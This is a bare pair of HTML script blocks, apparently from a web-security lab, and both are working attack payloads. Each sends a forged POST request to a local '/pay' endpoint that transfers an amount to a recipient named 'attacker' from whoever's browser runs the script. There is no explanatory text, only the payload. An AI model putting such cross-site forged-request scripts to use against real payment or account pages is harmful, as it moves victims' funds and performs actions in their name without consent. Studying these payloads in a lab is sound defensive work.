<script>
  var xhr = new XMLHttpRequest();
  xhr.open("POST", 'http://localhost:8080/pay', true);
  xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhr.send("recipient=attacker&amount=1&submit=Pay");
</script>

<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://localhost:8080/pay', true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
xhr.send("recipient=attacker&amount=1&submit=pay");
</script>